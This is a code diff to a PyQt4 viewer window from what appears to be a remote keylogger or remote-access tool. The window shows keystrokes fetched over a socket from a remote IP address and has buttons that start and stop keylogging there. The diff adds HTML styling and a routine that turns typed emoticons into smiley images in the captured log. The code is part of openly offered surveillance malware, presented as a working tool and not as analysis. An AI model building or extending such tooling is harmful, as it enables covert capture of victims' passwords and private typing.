@@ -2,6 +2,7 @@ from PyQt4.QtGui import *
 from PyQt4.QtCore import *
 
 from ast import literal_eval
+import os
 
 from main_ui import Ui_Form
 
@@ -15,6 +16,8 @@ class mainPopup(QWidget, Ui_Form):
         self.sock = args['sock']
         self.socket = args['socket']
         self.ipAddress = args['ipAddress']
+        self.assets = args['assets']
+        self.smileys = os.path.join(self.assets, 'smile')
 
         self.setWindowTitle('Keystokes from - %s - Socket #%s' % (self.ipAddress, self.socket))
 
@@ -38,17 +41,36 @@ class mainPopup(QWidget, Ui_Form):
             self.stopKeyloggingButton.setVisible(True)
             self.startKeyloggingButton.setVisible(False)
 
+    def convert_smileys(self):
+
+        def smile(smile_):
+            return '<img src="%s" alt="%s">' % (os.path.join(self.smileys, smile_+'.png'), smile_)
+
+        data = self.keystokesText.toHtml()
+        data.replace(':)', smile('i)'))
+        data.replace(':D', smile('iD'))
+        data.replace(':P', smile('iP'))
+        data.replace(';)', smile('j)'))
+        data.replace('>:(', smile('.i('))
+        data.replace(':(', smile('i('))
+        data.replace('o.O', smile('o.O'))
+        data.replace(':O', smile('iO'))
+        data.replace('>:)', smile('.i)'))
+        data.replace(':*', smile('kiss'))
+        self.keystokesText.setHtml(data)
+        self.keystokesText.moveCursor(QTextCursor.End)
+
     def set_logs(self):
         try:
             data = get(self.sock, 'getKeystokes', 'keystokes')
             result = literal_eval(data)
             for k in result:
                 if k != self.last_title:
-                    self.keystokesText.append('<br><p align=center><font color=lime>%s</font><p><br>' % k)
+                    self.keystokesText.append('<br><p align="center" style="background-color: #283239; color: #E04C2A;">%s</p><br>' % k)
                 self.keystokesText.moveCursor(QTextCursor.End)
                 self.keystokesText.insertHtml(result[k])
-                self.keystokesText.moveCursor(QTextCursor.End)
                 self.last_title = k
+            self.convert_smileys()
         except AttributeError:
             pass
 
